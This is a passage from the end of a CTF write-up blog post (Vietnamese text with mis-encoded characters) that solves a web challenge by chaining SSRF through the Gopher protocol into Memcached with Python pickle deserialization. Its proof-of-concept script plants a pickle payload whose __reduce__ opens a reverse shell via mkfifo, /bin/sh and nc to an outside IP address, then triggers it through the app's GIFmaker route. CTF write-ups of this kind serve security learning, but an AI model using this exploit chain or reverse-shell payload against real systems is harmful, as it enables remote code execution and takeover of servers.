</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> _speedup101<span style=color:#f92672>.</span>get(_key) <span style=color:#f92672>==</span> <span style=color:#66d9ef>None</span>:
</span></span><span style=display:flex><span>        _speedup101<span style=color:#f92672>.</span>set(_key, <span style=color:#e6db74>&#34;Copyright@HelloVietNamv2&#34;</span>, time<span style=color:#f92672>=</span><span style=color:#ae81ff>60</span>)
</span></span><span style=display:flex><span>        _speedup101<span style=color:#f92672>.</span>set(_value, _value, time<span style=color:#f92672>=</span><span style=color:#ae81ff>60</span>)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> _speedup101<span style=color:#f92672>.</span>get(_key), _speedup101<span style=color:#f92672>.</span>get(_value)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex;background-color:#3c3d38><span>        _speedup101<span style=color:#f92672>.</span>set(_value, _value, time<span style=color:#f92672>=</span><span style=color:#ae81ff>60</span>)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> _speedup101<span style=color:#f92672>.</span>get(_key), _speedup101<span style=color:#f92672>.</span>get(_value)
</span></span></code></pre></div><p>Váº­y Ä‘á»ƒ trigger Ä‘Æ°á»£c thÃ¬ chÃºng ta cáº§n pháº£i <code>get</code> Ä‘Æ°á»£c key mÃ  ta Ä‘Ã£ <code>set</code> cho Memcached trÆ°á»›c Ä‘Ã³ thÃ´ng qua Gopher protocol.</p><h3 id=exploit>Exploit<a hidden class=anchor aria-hidden=true href=#exploit>#</a></h3><p>DÃ¹ng Gopher protocol request Ä‘áº¿n Memcached Ä‘á»ƒ <code>set</code> 1 key vá»›i tÃªn báº¥t kÃ¬ (gá»i key nÃ y tÃªn lÃ  <code>this_is_key</code>) vá»›i value lÃ  pickle serialized data (aka payload) cá»§a chÃºng ta. Sau Ä‘Ã³ gá»i Ä‘áº¿n route <code>/GIFmaker</code> Ä‘á»ƒ trigger cÃ¡i key nÃ y.</p><p>Memcached command cá»§a chÃºng ta nhÆ° sau:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>set this_is_key 1 10 &lt;payload_length&gt;
</span></span><span style=display:flex><span>&lt;payload&gt;
</span></span></code></pre></div><ul><li><code>this_is_key</code> - lÃ  tÃªn key mÃ  chÃºng ta muá»‘n set.</li><li><code>1</code> - Ä‘Ã¢y lÃ  tham sá»‘ <code>flags</code>, dÃ¹ng Ä‘á»ƒ cho pylibmc biáº¿t khi <code>get</code> key nÃ y sáº½ pháº£i deserialize báº±ng Pickle.</li><li><code>10</code> - expired time, tÃ­nh báº±ng giÃ¢y.</li><li><code>&lt;payload_length></code> vÃ  <code>&lt;payload></code> thÃ¬ cháº¯c khÃ´ng cáº§n pháº£i giáº£i thÃ­ch ná»¯a.</li></ul><h4 id=proof-of-concept>Proof-of-concept<a hidden class=anchor aria-hidden=true href=#proof-of-concept>#</a></h4><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> time <span style=color:#f92672>import</span> time
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> os <span style=color:#f92672>import</span> system
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> urllib
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> pickle
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> requests
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> random
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> sys
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>ALPHA <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;abcdefghijklmnopqrstuvwxyz&#34;</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>rand_string</span>(length):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#39;&#39;</span><span style=color:#f92672>.</span>join([random<span style=color:#f92672>.</span>choice(ALPHA) <span style=color:#66d9ef>for</span> _ <span style=color:#f92672>in</span> range(length)])
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Exploit</span>(object):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>__reduce__</span>(self):
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> system, (<span style=color:#e6db74>&#39;rm -f /tmp/f; mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 3.0.119.151 3000 &gt; /tmp/f&#39;</span>,)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>title <span style=color:#f92672>=</span> rand_string(<span style=color:#ae81ff>6</span>)
</span></span><span style=display:flex><span>payload <span style=color:#f92672>=</span> pickle<span style=color:#f92672>.</span>dumps(Exploit())
</span></span><span style=display:flex><span>payload <span style=color:#f92672>=</span> [
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;set </span><span style=color:#e6db74>%s</span><span style=color:#e6db74> 1 10 </span><span style=color:#e6db74>%d</span><span style=color:#e6db74>&#39;</span> <span style=color:#f92672>%</span> (title, len(payload)),
</span></span><span style=display:flex><span>    payload,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;&#39;</span>
</span></span><span style=display:flex><span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>print <span style=color:#e6db74>&#39;Start requesting...&#39;</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>    res <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>post(<span style=color:#e6db74>&#39;http://hellovietnamv2.0x1337.space:31337/loadexternalvideo&#39;</span>, data<span style=color:#f92672>=</span>{
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;inputTitle&#39;</span>: rand_string(<span style=color:#ae81ff>6</span>),
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;inputDescription&#39;</span>: <span style=color:#e6db74>&#39;description&#39;</span>,
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;video_url&#39;</span>: <span style=color:#e6db74>&#39;gopher://127.0.0.1:11211/_&#39;</span> <span style=color:#f92672>+</span> urllib<span style=color:#f92672>.</span>quote(<span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\r\n</span><span style=color:#e6db74>&#39;</span><span style=color:#f92672>.</span>join(payload)),
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;timestamp&#39;</span>: int(time()) <span style=color:#f92672>-</span> <span style=color:#ae81ff>2</span>
</span></span><span style=display:flex><span>    }, cookies<span style=color:#f92672>=</span>{
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;session&#39;</span>: <span style=color:#e6db74>&#39;redacted&#39;</span>
</span></span><span style=display:flex><span>    }, timeout<span style=color:#f92672>=</span><span style=color:#ae81ff>3</span>)
</span></span><span style=display:flex><span>    print res<span style=color:#f92672>.</span>content
</span></span><span style=display:flex><span><span style=color:#66d9ef>except</span>:
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>pass</span>
</span></span><span style=display:flex><span>print <span style=color:#e6db74>&#39;Done!&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>print <span style=color:#e6db74>&#39;Start triggering payload...&#39;</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>    res <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>post(<span style=color:#e6db74>&#39;http://hellovietnamv2.0x1337.space:31337/GIFmaker&#39;</span>, data<span style=color:#f92672>=</span>{
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;inputTitle&#39;</span>: title,
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;inputDescription&#39;</span>: <span style=color:#e6db74>&#39;description&#39;</span>,
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;filePath&#39;</span>: <span style=color:#e6db74>&#39;static/Uploads/aa587ed19a228d98431f142900b60633.mp4&#39;</span>,
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;timestamp&#39;</span>: int(time()) <span style=color:#f92672>-</span> <span style=color:#ae81ff>2</span>
</span></span><span style=display:flex><span>    }, cookies<span style=color:#f92672>=</span>{
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;session&#39;</span>: <span style=color:#e6db74>&#39;redacted&#39;</span>
</span></span><span style=display:flex><span>    }, timeout<span style=color:#f92672>=</span><span style=color:#ae81ff>3</span>)
</span></span><span style=display:flex><span>    print res<span style=color:#f92672>.</span>content
</span></span><span style=display:flex><span><span style=color:#66d9ef>except</span>:
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>pass</span>
</span></span><span style=display:flex><span>print <span style=color:#e6db74>&#39;Done, exit program!&#39;</span>
</span></span></code></pre></div><p><img loading=lazy src=https://i.imgur.com/gsyWzxH.jpg alt></p><h1 id=last-words>Last words<a hidden class=anchor aria-hidden=true href=#last-words>#</a></h1><p>Cáº£m Æ¡n 2 anh <a href=https://twitter.com/ducnt_>@ducnt</a> vÃ  <a href=https://twitter.com/tsug0d>@tsug0d</a> Ä‘Ã£ táº¡o ra nhá»¯ng Ä‘á» Web hay ho cho dá»‹p Ä‘áº§u nÄƒm 2020, support nhiá»‡t tÃ¬nh cho em Ä‘á»ƒ cÃ³ thá»ƒ giáº£i Ä‘Æ°á»£c háº¿t táº¥t cáº£ cÃ¡c Web challenge cÅ©ng nhÆ° nháº±m Ã´n láº¡i nhá»¯ng kiáº¿n thá»©c Ä‘Ã£ Ä‘Æ°á»£c há»c trong nÄƒm 2019 Ä‘Ã£ qua.</p><p>ChÃºc má»«ng nÄƒm má»›i 2ï¸âƒ£0ï¸âƒ£2ï¸âƒ£0ï¸âƒ£ everyone!</p></div><footer class=post-footer><ul class=post-tags><li><a href=https://blog.undo.pw/tags/ctf/>ctf</a></li><li><a href=https://blog.undo.pw/tags/web/>web</a></li></ul><nav class=paginav><a class=prev href=https://blog.undo.pw/posts/tsgctf-2020-beginners-pwn/><span class=title>Â« Prev</span><br><span>TSGCTF 2020 - Beginner's Pwn</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2022 <a href=https://blog.undo.pw/>blog.undo.pw</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>